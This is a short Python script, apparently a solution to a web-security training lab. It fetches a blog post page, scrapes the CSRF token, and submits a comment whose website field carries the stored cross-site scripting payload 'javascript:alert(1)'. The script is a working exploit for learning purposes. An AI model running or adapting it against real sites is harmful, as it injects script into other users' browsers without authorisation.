import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
view_comment = burp_url + '/post?postId=9'
comment = burp_url + '/post/comment'

session = requests.Session()
response = session.get(view_comment)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "postId": "9", "comment": "12", "name": "1", "email": "1@1.com", "website": "javascript:alert(1)"}
session.post(comment, data=burp_data)
